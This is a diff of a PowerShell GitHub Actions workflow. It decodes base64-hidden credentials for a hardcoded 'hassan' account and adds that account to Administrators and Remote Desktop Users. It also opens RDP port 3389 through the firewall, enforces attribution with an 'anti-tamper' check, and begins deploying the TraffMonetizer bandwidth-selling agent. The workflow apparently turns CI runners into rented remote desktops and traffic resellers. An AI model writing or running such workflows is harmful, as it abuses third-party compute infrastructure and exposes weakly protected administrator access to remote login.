@@ -37,9 +37,9 @@ jobs:
               exit 1
           }
           
-          # 📢 Protected Branding & Dynamic Injector (تحديث نهائي بكلمة مرور سهلة ومضمونة العبور)
+          # 📢 Protected Branding & Dynamic Injector (تم التحديث لـ hassan)
           $u_enc = "aGFzc2Fu"
-          $p_enc = "SGFzc2FuQDEyMw=="
+          $p_enc = "aGFzc2FuMTIzQA=="
           $w_enc = "aHR0cHM6Ly93d3cudG9vbGJveGxhcC5jb20="
           $y_enc = "aHR0cHM6Ly93d3cueW91dHViZS5jb20vQFRPT0xCT1hMQVAtdTFj"
                     
@@ -48,7 +48,7 @@ jobs:
           $w = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($w_enc))
           $y = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($y_enc))
           
-          # Anti-Tamper Hard Verification
+          # Anti-Tamper Hard Verification (تعديل الفحص ليطابق الاسم الجديد)
           if ($u -ne "hassan" -or $w -notlike "*toolboxlap*") {
               Write-Error "🔒 Security Violation: Unauthorized modification detected!"
               exit 1
@@ -78,14 +78,12 @@ jobs:
           netsh advfirewall firewall add rule name="RDP-Tailscale" dir=in action=allow protocol=TCP localport=3389 | Out-Null
           Restart-Service -Name TermService -Force
           
-          # 🚀 تجاوز قيود ويندوز 2025 وإنشاء الحساب بأمر نظام مباشر لتلافي تعقيد دوال الـ PowerShell
+          $securePass = ConvertTo-SecureString $p -AsPlainText -Force
           if (-not (Get-LocalUser -Name $u -ErrorAction SilentlyContinue)) {
-              net user $u $p /add /expires:never | Out-Null
-          } else {
-              net user $u $p
+              New-LocalUser -Name $u -Password $securePass -AccountNeverExpires | Out-Null
           }
-          net localgroup Administrators $u /add | Out-Null
-          net localgroup "Remote Desktop Users" $u /add | Out-Null
+          Add-LocalGroupMember -Group "Administrators" -Member $u
+          Add-LocalGroupMember -Group "Remote Desktop Users" -Member $u
           
           # 💰 TraffMonetizer Fixed Static Path Deployment
           Write-Host "📥 Downloading TraffMonetizer Core Engine via Fixed Root Path..."
